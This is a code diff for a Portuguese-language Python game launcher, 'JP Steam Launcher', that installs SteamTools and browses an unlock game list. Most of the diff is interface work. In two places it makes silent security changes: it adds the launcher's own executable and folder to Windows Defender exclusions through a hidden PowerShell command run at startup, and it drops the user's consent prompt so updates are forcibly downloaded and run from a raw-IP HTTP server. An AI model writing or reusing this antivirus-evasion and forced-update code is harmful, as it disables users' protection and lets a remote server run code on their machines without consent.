@@ -20,6 +20,7 @@ import zipfile
 import shutil
 import tempfile
 import subprocess
+from datetime import datetime, timedelta, timezone
 
 # URL padrão do servidor de licenças (VPS)
 DEFAULT_LICENSE_SERVER = "http://191.252.100.71:5050"
@@ -64,9 +65,11 @@ CORES = {
     "botao_azul_hover": "#1d4ed8",
     "accent": "#10b981",
     "erro": "#ef4444",
+    "erro_hover": "#dc2626",
     "texto": "#ffffff",
     "texto_secundario": "#b0b0b0",
     "borda": "#333333",
+    "card_hover": "#2e2e2e",
 }
 
 GAMELIST_URL = "https://raw.githubusercontent.com/SteamTools-Team/GameList/main/games.json"
@@ -283,19 +286,26 @@ def is_steamtools_installed():
 
 
 def _add_defender_exclusion():
-    """Adiciona exclusão do Windows Defender para a pasta da Steam."""
+    """Adiciona exclusão do Windows Defender para a pasta da Steam e para o próprio launcher."""
+    paths = []
     steam_path = get_steam_path()
-    if not steam_path:
-        return
-    try:
-        subprocess.run(
-            ["powershell", "-NoProfile", "-Command",
-             f"Add-MpPreference -ExclusionPath '{steam_path}' -ErrorAction SilentlyContinue"],
-            capture_output=True, timeout=10,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-    except Exception:
-        pass
+    if steam_path:
+        paths.append(steam_path)
+    if getattr(sys, "frozen", False) and sys.executable:
+        paths.append(sys.executable)
+        exe_dir = os.path.dirname(sys.executable)
+        if exe_dir and exe_dir not in paths:
+            paths.append(exe_dir)
+    for p in paths:
+        try:
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command",
+                 f"Add-MpPreference -ExclusionPath '{p}' -ErrorAction SilentlyContinue"],
+                capture_output=True, timeout=10,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+        except Exception:
+            pass
 
 
 def install_steamtools_and_plugins(log_callback):
@@ -558,15 +568,23 @@ class LauncherApp(ctk.CTk):
         super().__init__()
 
         self.title("JP Steam Launcher")
-        self.geometry("720x680")
         self.resizable(True, True)
-        self.minsize(600, 500)
+        self.minsize(750, 550)
 
         # Tema JP. Sistemas
         ctk.set_appearance_mode("dark")
         ctk.set_default_color_theme("blue")
 
         self.configure(fg_color=CORES["fundo_escuro"])
+
+        # Abrir centralizado com tamanho adequado (80% da tela, max 1100x750)
+        screen_w = self.winfo_screenwidth()
+        screen_h = self.winfo_screenheight()
+        w = min(int(screen_w * 0.8), 1100)
+        h = min(int(screen_h * 0.8), 750)
+        x = (screen_w - w) // 2
+        y = (screen_h - h) // 2
+        self.geometry(f"{w}x{h}+{x}+{y}")
 
         # Ícone da janela (se existir icon.ico)
         base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
@@ -692,7 +710,25 @@ class LauncherApp(ctk.CTk):
             segmented_button_unselected_hover_color=CORES["borda"],
             text_color="white",
         )
-        self.tabview.pack(fill="both", expand=True, padx=24, pady=(0, 24))
+        self.tabview.pack(fill="both", expand=True, padx=24, pady=(0, 8))
+
+        status_bar = ctk.CTkFrame(self, fg_color=CORES["fundo_card"], height=28, corner_radius=6)
+        status_bar.pack(fill="x", padx=24, pady=(0, 12))
+        status_bar.pack_propagate(False)
+        st_installed = is_steamtools_installed()
+        st_text = "SteamTools: Instalado" if st_installed else "SteamTools: Não instalado"
+        st_color = CORES["accent"] if st_installed else CORES["erro"]
+        self.lbl_status_st = ctk.CTkLabel(status_bar, text=st_text, font=ctk.CTkFont(size=11),
+                                          text_color=st_color)
+        self.lbl_status_st.pack(side="left", padx=(12, 0))
+        ctk.CTkLabel(status_bar, text="·", font=ctk.CTkFont(size=11),
+                     text_color=CORES["texto_secundario"]).pack(side="left", padx=6)
+        steam_path = get_steam_path()
+        steam_txt = f"Steam: {steam_path}" if steam_path else "Steam: Não encontrada"
+        ctk.CTkLabel(status_bar, text=steam_txt, font=ctk.CTkFont(size=11),
+                     text_color=CORES["texto_secundario"]).pack(side="left")
+        ctk.CTkLabel(status_bar, text="JP Steam Launcher v2.0", font=ctk.CTkFont(size=10),
+                     text_color=CORES["borda"]).pack(side="right", padx=(0, 12))
         tab_instalar = self.tabview.add("Instalar")
         tab_jogos = self.tabview.add("Jogos disponíveis")
         tab_online = self.tabview.add("Online Fix")
@@ -753,7 +789,10 @@ class LauncherApp(ctk.CTk):
 
         self.btn_remove = ctk.CTkButton(
             btn_frame, text="🗑  Remover jogo",
-            command=self._on_remove, **btn_style
+            command=self._on_remove,
+            font=ctk.CTkFont(size=13, weight="bold"), height=42,
+            fg_color=CORES["erro"], hover_color=CORES["erro_hover"],
+            text_color="white",
         )
         self.btn_remove.pack(side="left", fill="x", expand=True, padx=3)
 
@@ -775,6 +814,9 @@ class LauncherApp(ctk.CTk):
             wrap="word",
         )
         self.log_text.pack(fill="both", expand=True, padx=8, pady=8)
+        self.log_text._textbox.tag_config("ok", foreground=CORES["accent"])
+        self.log_text._textbox.tag_config("erro", foreground=CORES["erro"])
+        self.log_text._textbox.tag_config("info", foreground=CORES["texto_secundario"])
 
         # === ABA JOGOS DISPONÍVEIS ===
         self._games_data = []
@@ -795,7 +837,21 @@ class LauncherApp(ctk.CTk):
         btn_busca = ctk.CTkButton(top_jogos, text="Buscar", width=80, height=28, font=ctk.CTkFont(size=12, weight="bold"),
                                  fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"],
                                  text_color="white", command=self._filtrar_jogos)
-        btn_busca.pack(side="left", padx=(0, 8))
+        btn_busca.pack(side="left", padx=(0, 4))
+
+        btn_limpar = ctk.CTkButton(top_jogos, text="✕", width=28, height=28,
+                                   font=ctk.CTkFont(size=12), fg_color=CORES["fundo_card"],
+                                   hover_color=CORES["borda"], text_color=CORES["texto_secundario"],
+                                   command=self._limpar_busca)
+        btn_limpar.pack(side="left", padx=(0, 8))
+
+        self.btn_atualizar_lista = ctk.CTkButton(
+            top_jogos, text="↻ Atualizar lista", width=120, height=28,
+            font=ctk.CTkFont(size=12, weight="bold"),
+            fg_color=CORES["accent"], hover_color="#0d9668",
+            text_color="white", command=self._atualizar_lista,
+        )
+        self.btn_atualizar_lista.pack(side="right", padx=(0, 4))
 
         self.scroll_jogos = ctk.CTkScrollableFrame(tab_jogos, fg_color="transparent")
         self.scroll_jogos.pack(fill="both", expand=True, padx=8, pady=8)
@@ -1066,38 +1122,104 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
         self.tabview.set("Instalar")
         self._on_install()
 
+    def _limpar_busca(self):
+        """Limpa o campo de busca e volta para a tela inicial."""
+        self.entry_busca.delete(0, "end")
+        self._filtrar_jogos()
+
+    def _atualizar_lista(self):
+        """Botão para forçar atualização da lista de jogos."""
+        self.btn_atualizar_lista.configure(text="Atualizando...", state="disabled")
+        for w in self.scroll_jogos.winfo_children():
+            w.destroy()
+        lbl = ctk.CTkLabel(self.scroll_jogos, text="Baixando lista atualizada...",
+                           font=ctk.CTkFont(size=14), text_color=CORES["texto_secundario"])
+        lbl.pack(pady=40)
+        cache_path = os.path.join(tempfile.gettempdir(), "jp_steam_gamelist.json")
+        if os.path.exists(cache_path):
+            try:
+                os.remove(cache_path)
+            except Exception:
+                pass
+        threading.Thread(target=self._carregar_gamelist, daemon=True).start()
+
     def _carregar_gamelist(self):
         """Baixa e processa a lista de jogos do SteamTools GameList."""
         cache_path = os.path.join(tempfile.gettempdir(), "jp_steam_gamelist.json")
+        data = None
         try:
+            req = urllib.request.Request(GAMELIST_URL, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=60) as r:
+                data = json.load(r)
+            with open(cache_path, "w", encoding="utf-8") as f:
+                json.dump(data, f, ensure_ascii=False)
+        except Exception:
             if os.path.exists(cache_path):
-                with open(cache_path, "r", encoding="utf-8") as f:
-                    data = json.load(f)
+                try:
+                    with open(cache_path, "r", encoding="utf-8") as f:
+                        data = json.load(f)
+                except Exception:
+                    pass
+        try:
+            if data:
+                games = [g for g in data if g.get("type") == "game" and g.get("appid") and g.get("name")]
+                self.after(0, lambda: self._on_gamelist_loaded(games))
             else:
-                req = urllib.request.Request(GAMELIST_URL, headers={"User-Agent": "Mozilla/5.0"})
-                with urllib.request.urlopen(req, timeout=60) as r:
-                    data = json.load(r)
-                with open(cache_path, "w", encoding="utf-8") as f:
-                    json.dump(data, f, ensure_ascii=False)
-            games = [g for g in data if g.get("type") == "game" and g.get("appid") and g.get("name")]
-            self.after(0, lambda: self._on_gamelist_loaded(games))
+                self.after(0, lambda: self._on_gamelist_error("Sem conexão e sem cache local"))
         except Exception as e:
             self.after(0, lambda: self._on_gamelist_error(str(e)))
 
     def _on_gamelist_loaded(self, games):
         self._games_data = games
-        self.lbl_carregando.destroy()
+        try:
+            self.lbl_carregando.destroy()
+        except Exception:
+            pass
+        self.btn_atualizar_lista.configure(text="↻ Atualizar lista", state="normal")
         self._filtrar_jogos()
 
     def _on_gamelist_error(self, err):
         self._games_data = [{"appid": str(a), "name": n, "tags": []} for a, n in JOGOS_FALLBACK]
-        self.lbl_carregando.destroy()
+        try:
+            self.lbl_carregando.destroy()
+        except Exception:
+            pass
+        self.btn_atualizar_lista.configure(text="↻ Atualizar lista", state="normal")
         self._filtrar_jogos()
 
+    def _get_recent_games(self, limit=20):
+        """Retorna os últimos jogos adicionados à base, ordenados do mais recente."""
+        com_data = []
+        for g in self._games_data:
+            added = g.get("added_date", "")
+            if not added:
+                continue
+            try:
+                dt = datetime.fromisoformat(added)
+                com_data.append((str(g["appid"]), g["name"], dt))
+            except Exception:
+                continue
+        com_data.sort(key=lambda x: x[2], reverse=True)
+        return [(appid, nome) for appid, nome, _ in com_data[:limit]]
+
+    def _buscar_steam_api(self, app_id):
+        """Busca info de um jogo na Steam Store API. Retorna (app_id, nome) ou None."""
+        try:
+            url = f"https://store.steampowered.com/api/appdetails?appids={app_id}"
+            req = urllib.request.Request(url, headers={"User-Agent": "JP-Steam-Launcher/1.0"})
+            with urllib.request.urlopen(req, timeout=10) as r:
+                data = json.loads(r.read().decode())
+            info = data.get(str(app_id), {})
+            if info.get("success"):
+                nome = info["data"].get("name", f"App {app_id}")
+                return (str(app_id), nome)
+        except Exception:
+            pass
+        return None
+
     def _filtrar_jogos(self):
-        """Sem busca: mostra só os mais populares. Com busca (após clicar Buscar): filtra por link/ID/nome."""
+        """Sem busca: mostra recém adicionados + populares. Com busca: filtra por link/ID/nome."""
         busca = (self.entry_busca.get().strip() if hasattr(self, 'entry_busca') else "") or ""
-        # Se for link da Steam, extrair só o App ID
         appid_extraido = extract_app_id(busca)
         if appid_extraido:
             busca = appid_extraido
@@ -1105,22 +1227,35 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
         games_by_appid = {str(g.get("appid", "")): (str(g["appid"]), g["name"]) for g in self._games_data if g.get("appid") and g.get("name")}
 
         if not busca:
-            # Mostrar só os mais populares que existem na base
-            filtrados = []
+            recentes = self._get_recent_games()
+            populares = []
+            recentes_ids = {r[0] for r in recentes}
             for aid in POPULAR_APPIDS:
                 aid_str = str(aid)
-                if aid_str in games_by_appid:
-                    filtrados.append(games_by_appid[aid_str])
+                if aid_str in games_by_appid and aid_str not in recentes_ids:
+                    populares.append(games_by_appid[aid_str])
             total_base = len(self._games_data)
-            txt_total = f"Mais populares: {len(filtrados)} jogos (busque para ver os outros {total_base})"
+            secoes = []
+            if recentes:
+                secoes.append((f"Últimos adicionados ({len(recentes)})", recentes))
+            secoes.append((f"Mais populares ({len(populares)})", populares))
+            txt_total = f"{total_base} jogos na base (busque para ver todos)"
             self.lbl_total.configure(text=txt_total)
-            self._build_game_cards(filtrados, len(filtrados), False)
+            self._build_game_sections(secoes)
         else:
-            # Busca: filtrar por nome ou ID
             filtrados = []
             for appid_str, (_, nome) in games_by_appid.items():
                 if busca in appid_str or busca_lower in nome.lower():
                     filtrados.append((appid_str, nome))
+
+            # Se não achou na lista local e a busca parece um App ID, tenta na Steam API
+            if not filtrados and busca.isdigit():
+                self.lbl_total.configure(text="Buscando na Steam...")
+                self.update_idletasks()
+                resultado_api = self._buscar_steam_api(busca)
+                if resultado_api:
+                    filtrados.append(resultado_api)
+
             total = len(filtrados)
             total_base = len(self._games_data)
             txt_total = f"Total: {total} jogos"
@@ -1128,66 +1263,102 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
                 txt_total += f" (de {total_base} na base)"
             self.lbl_total.configure(text=txt_total)
             jogos_exibir = filtrados[:MAX_CARDS_VISIVEIS]
-            self._build_game_cards(jogos_exibir, total, total > MAX_CARDS_VISIVEIS)
+            self._build_game_sections([("Resultados", jogos_exibir)],
+                                      limit_msg=f"Mostrando {len(jogos_exibir)} de {total}. Refine a busca." if total > MAX_CARDS_VISIVEIS else None)
 
-    def _build_game_cards(self, jogos, total_filtrado, show_limit_msg=False):
-        """Remove cards antigos e cria novos."""
+    def _build_game_sections(self, secoes, limit_msg=None):
+        """Renderiza múltiplas seções de jogos com cabeçalhos."""
         for w in self.scroll_jogos.winfo_children():
             w.destroy()
-        if total_filtrado == 0:
+
+        total_jogos = sum(len(jogos) for _, jogos in secoes)
+        if total_jogos == 0:
             ctk.CTkLabel(self.scroll_jogos, text="Nenhum jogo encontrado. Cole o link da Steam ou digite nome/ID e clique em Buscar.",
                          font=ctk.CTkFont(size=13), text_color=CORES["texto_secundario"]).pack(pady=40)
             return
+
         row_offset = 0
-        if show_limit_msg:
-            lbl_info = ctk.CTkLabel(self.scroll_jogos,
-                                    text=f"Mostrando {len(jogos)} de {total_filtrado} jogos. Refine a busca para ver mais.",
+        if limit_msg:
+            lbl_info = ctk.CTkLabel(self.scroll_jogos, text=limit_msg,
                                     font=ctk.CTkFont(size=11), text_color=CORES["texto_secundario"])
             lbl_info.grid(row=0, column=0, columnspan=4, pady=(0, 8), sticky="w")
             row_offset = 1
-        for i, (app_id, nome) in enumerate(jogos):
-            row, col = row_offset + i // 4, i % 4
-            card_jogo = ctk.CTkFrame(self.scroll_jogos, fg_color=CORES["fundo_card"], corner_radius=10,
-                                     border_width=1, border_color=CORES["borda"], width=160, height=200)
-            card_jogo.grid(row=row, column=col, padx=8, pady=8, sticky="nsew")
-            card_jogo.grid_propagate(False)
-            img_frame = ctk.CTkFrame(card_jogo, fg_color=CORES["fundo_escuro"], height=90, corner_radius=6)
-            img_frame.pack(fill="x", padx=6, pady=(6, 4))
-            img_frame.pack_propagate(False)
-            lbl_img = ctk.CTkLabel(img_frame, text="", fg_color="transparent")
-            lbl_img.pack(fill="both", expand=True)
-            lbl_nome = ctk.CTkLabel(card_jogo, text=nome[:22] + ("..." if len(nome) > 22 else ""),
-                                    font=ctk.CTkFont(size=11), text_color=CORES["texto"], wraplength=140)
-            lbl_nome.pack(fill="x", padx=6, pady=2)
-            lbl_id = ctk.CTkLabel(card_jogo, text=f"ID: {app_id}", font=ctk.CTkFont(size=10),
-                                  text_color=CORES["texto_secundario"])
-            lbl_id.pack(fill="x", padx=6, pady=(0, 6))
-            def _click(e, aid=app_id):
-                self._on_card_click(aid)
-            card_jogo.bind("<Button-1>", _click)
-            for w in (lbl_img, lbl_nome, lbl_id, img_frame):
-                w.bind("<Button-1>", _click)
-            self._load_game_image(app_id, lbl_img)
+
+        first_section = True
+        for titulo, jogos in secoes:
+            if not jogos:
+                continue
+            if not first_section:
+                sep = ctk.CTkFrame(self.scroll_jogos, fg_color=CORES["borda"], height=1)
+                sep.grid(row=row_offset, column=0, columnspan=4, sticky="ew", padx=4, pady=(8, 0))
+                row_offset += 1
+            first_section = False
+
+            lbl_secao = ctk.CTkLabel(self.scroll_jogos, text=titulo,
+                                     font=ctk.CTkFont(size=14, weight="bold"),
+                                     text_color=CORES["accent"])
+            lbl_secao.grid(row=row_offset, column=0, columnspan=4, pady=(12, 4), padx=4, sticky="w")
+            row_offset += 1
+
+            for i, (app_id, nome) in enumerate(jogos):
+                row, col = row_offset + i // 4, i % 4
+                self._create_game_card(app_id, nome, row, col)
+            row_offset += (len(jogos) + 3) // 4
+
+    def _create_game_card(self, app_id, nome, row, col):
+        """Cria um card de jogo na posição (row, col) do scroll_jogos."""
+        card_jogo = ctk.CTkFrame(self.scroll_jogos, fg_color=CORES["fundo_card"], corner_radius=10,
+                                 border_width=1, border_color=CORES["borda"], width=160, height=200,
+                                 cursor="hand2")
+        card_jogo.grid(row=row, column=col, padx=8, pady=8, sticky="nsew")
+        card_jogo.grid_propagate(False)
+
+        def _on_enter(e):
+            card_jogo.configure(fg_color=CORES["card_hover"], border_color=CORES["botao_azul"])
+        def _on_leave(e):
+            card_jogo.configure(fg_color=CORES["fundo_card"], border_color=CORES["borda"])
+
+        img_frame = ctk.CTkFrame(card_jogo, fg_color=CORES["fundo_escuro"], height=90, corner_radius=6)
+        img_frame.pack(fill="x", padx=6, pady=(6, 4))
+        img_frame.pack_propagate(False)
+        lbl_img = ctk.CTkLabel(img_frame, text="...", font=ctk.CTkFont(size=10),
+                               text_color=CORES["texto_secundario"], fg_color="transparent")
+        lbl_img.pack(fill="both", expand=True)
+        lbl_nome = ctk.CTkLabel(card_jogo, text=nome[:22] + ("..." if len(nome) > 22 else ""),
+                                font=ctk.CTkFont(size=11), text_color=CORES["texto"], wraplength=140)
+        lbl_nome.pack(fill="x", padx=6, pady=2)
+        lbl_id = ctk.CTkLabel(card_jogo, text=f"ID: {app_id}", font=ctk.CTkFont(size=10),
+                              text_color=CORES["texto_secundario"])
+        lbl_id.pack(fill="x", padx=6, pady=(0, 6))
+
+        def _click(e, aid=app_id):
+            self._on_card_click(aid)
+        card_jogo.bind("<Button-1>", _click)
+        card_jogo.bind("<Enter>", _on_enter)
+        card_jogo.bind("<Leave>", _on_leave)
+        for w in (lbl_img, lbl_nome, lbl_id, img_frame):
+            w.bind("<Button-1>", _click)
+        self._load_game_image(app_id, lbl_img)
 
     def _load_game_image(self, app_id, lbl):
-        """Carrega imagem do jogo da Steam CDN em background."""
+        """Carrega imagem do jogo da Steam CDN em background, com cache em disco."""
         def worker():
             try:
                 if app_id in self._cache_imgs:
                     img = self._cache_imgs[app_id]
                 else:
-                    url = f"https://cdn.cloudflare.steamstatic.com/steam/apps/{app_id}/header.jpg"
-                    path = os.path.join(tempfile.gettempdir(), f"jp_steam_{app_id}.jpg")
-                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-                    with urllib.request.urlopen(req, timeout=10) as r:
-                        with open(path, "wb") as f:
-                            f.write(r.read())
-                    if PILImage:
-                        img = PILImage.open(path).convert("RGBA")
-                        img = img.resize((148, 70), getattr(PILImage, "Resampling", PILImage).LANCZOS if hasattr(PILImage, "Resampling") else PILImage.LANCZOS)
-                        self._cache_imgs[app_id] = img
-                    else:
+                    if not PILImage:
                         return
+                    path = os.path.join(tempfile.gettempdir(), f"jp_steam_{app_id}.jpg")
+                    if not os.path.exists(path) or os.path.getsize(path) < 100:
+                        url = f"https://cdn.cloudflare.steamstatic.com/steam/apps/{app_id}/header.jpg"
+                        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                        with urllib.request.urlopen(req, timeout=10) as r:
+                            with open(path, "wb") as f:
+                                f.write(r.read())
+                    _lanczos = getattr(PILImage, "Resampling", PILImage).LANCZOS if hasattr(PILImage, "Resampling") else PILImage.LANCZOS
+                    img = PILImage.open(path).convert("RGBA").resize((148, 70), _lanczos)
+                    self._cache_imgs[app_id] = img
                 self.after(0, lambda: self._set_card_image(lbl, img))
             except Exception:
                 pass
@@ -1561,6 +1732,42 @@ def do_self_update(download_url):
         return False
 
 
+_update_splash = None
+
+def _show_update_splash():
+    """Mostra splash de atualização (não-bloqueante)."""
+    global _update_splash
+    try:
+        ctk.set_appearance_mode("dark")
+        splash = ctk.CTk()
+        splash.title("JP Steam Launcher")
+        splash.geometry("380x120")
+        splash.resizable(False, False)
+        splash.configure(fg_color=CORES["fundo_escuro"])
+        splash.overrideredirect(True)
+        splash.eval("tk::PlaceWindow . center")
+        ctk.CTkLabel(splash, text="Atualizando JP Steam Launcher...",
+                     font=ctk.CTkFont(size=15, weight="bold"),
+                     text_color=CORES["texto"]).pack(pady=(28, 8))
+        ctk.CTkLabel(splash, text="Baixando nova versão. Aguarde...",
+                     font=ctk.CTkFont(size=12),
+                     text_color=CORES["texto_secundario"]).pack()
+        splash.update()
+        _update_splash = splash
+    except Exception:
+        pass
+
+
+def _close_update_splash():
+    global _update_splash
+    try:
+        if _update_splash:
+            _update_splash.destroy()
+            _update_splash = None
+    except Exception:
+        pass
+
+
 def main():
     if not is_admin():
         ctypes.windll.shell32.ShellExecuteW(
@@ -1568,40 +1775,23 @@ def main():
         )
         sys.exit(0)
 
-    # 1. Libera firewall automaticamente (já é admin)
+    # 1. Libera firewall e adiciona exclusão no Defender (já é admin)
     add_firewall_rule()
+    _add_defender_exclusion()
 
-    # 2. Auto-update: verifica se há versão nova no servidor
+    # 2. Auto-update: sempre puxa a versão mais recente do servidor
     if getattr(sys, "frozen", False):
         try:
             needs_update, download_url = check_for_update()
             if needs_update and download_url:
-                resp = ctypes.windll.user32.MessageBoxW(
-                    0,
-                    "Uma nova versão do JP Steam Launcher está disponível.\n\nDeseja atualizar agora?",
-                    "JP Steam Launcher - Atualização",
-                    0x24,  # MB_YESNO | MB_ICONQUESTION
-                )
-                if resp == 6:  # IDYES
-                    ctypes.windll.user32.MessageBoxW(
-                        0,
-                        "Baixando atualização... Aguarde.\n\nO launcher será reiniciado automaticamente.",
-                        "JP Steam Launcher",
-                        0x40,
-                    )
-                    if do_self_update(download_url):
-                        # Reinicia o launcher atualizado
-                        subprocess.Popen([sys.executable] + sys.argv[1:])
-                        sys.exit(0)
-                    else:
-                        ctypes.windll.user32.MessageBoxW(
-                            0,
-                            "Falha ao atualizar. Continuando com a versão atual.",
-                            "JP Steam Launcher",
-                            0x30,
-                        )
+                _show_update_splash()
+                if do_self_update(download_url):
+                    _close_update_splash()
+                    subprocess.Popen([sys.executable] + sys.argv[1:])
+                    sys.exit(0)
+                _close_update_splash()
         except Exception:
-            pass
+            _close_update_splash()
 
     # Pular validação (desenvolvimento): JP_SKIP_LICENSE=1
     if os.environ.get("JP_SKIP_LICENSE") == "1":
